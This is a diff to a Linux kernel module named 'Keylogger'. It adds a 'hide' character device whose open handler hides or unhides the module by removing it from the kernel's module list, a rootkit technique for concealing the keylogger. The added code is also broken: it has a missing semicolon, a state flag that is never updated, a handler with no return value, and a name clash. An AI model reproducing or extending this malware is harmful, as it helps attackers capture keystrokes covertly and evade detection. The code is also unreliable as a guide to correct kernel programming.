@@ -19,19 +19,20 @@
 #define DEVICE_NAME "Keylogger"
 static char msg_Ptr[BUFF_SIZE];
 static size_t buf_pos;
-
+int is_hide = 0
 struct fake_device
 {
     char data[100];
     struct semaphore sem;
     
-} virtual_device;
+} virtual_device, virtual_device1;
 
 struct cdev *mcdev;
+struct cdev *mcdev1;
 int major_number;
 int ret;
 dev_t dev_num;
-
+dev_t dev_num1;
 struct list_head *module_list;
 
 void hide(void)
@@ -44,7 +45,17 @@ void unhide(void)
     list_add(&THIS_MODULE->list, module_list);
 }
 
-
+int dev_open_fops_for_hide(struct inode *inode, struct file* file)
+{
+    if (is_hide)
+    {
+        unhide();
+    }
+    else
+    {
+        hide();
+    }    
+}
 int device_open(struct inode *inode, struct file * filp)
 {
     //using mutex for allow only open process to use
@@ -56,6 +67,11 @@ int device_open(struct inode *inode, struct file * filp)
     printk(KERN_INFO "Keylogger: opend device");
     return 0;
 }
+static struct file_operations hide =
+{
+    .owner = THIS_MODULE,
+    .open = dev_open_fops_for_hide
+};
 
 ssize_t device_write(struct file *flip, const char * buff_sorce_data, size_t buff_count, loff_t * offset)
 {
@@ -94,12 +110,35 @@ static struct file_operations fops =
     .release = device_close,
     .open = device_open
 };
+static int hide_driver_entery(void)
+{
+    ret = alloc_chrdev_region(&dev_num1, 0, 1, "hide");
+    if (ret < 0)
+    {
+        printk(KERN_ALERT "Keylogger: failed to allocate a major number for hide");
+        return ret;
+    }
+    major_number = MAJOR(dev_num1);
+    mcdev1 = cdev_alloc();
+    mcdev1->ops = &hide;
+    mcdev1->owner = THIS_MODULE;
+    ret = cdev_add(mcdev1, dev_num1, 1);
+    if (ret < 0)
+    {
+        printk(KERN_ALERT "kelogger: unable to add hide cdev to kernel");
+        return -1;
+    }
+    sema_init(&virtual_device1.sem, 1);
+    return 0;
+
+
+}
 static int driver_entry(void)
 {
     ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
     if (ret < 0)
     {
-        printk(KERN_ALERT "Keylogger: failed to allocate a major number");
+        printk(KERN_ALERT "Keylogger: failed to allocate a major number for fops");
         return ret;
     }
     major_number = MAJOR(dev_num);
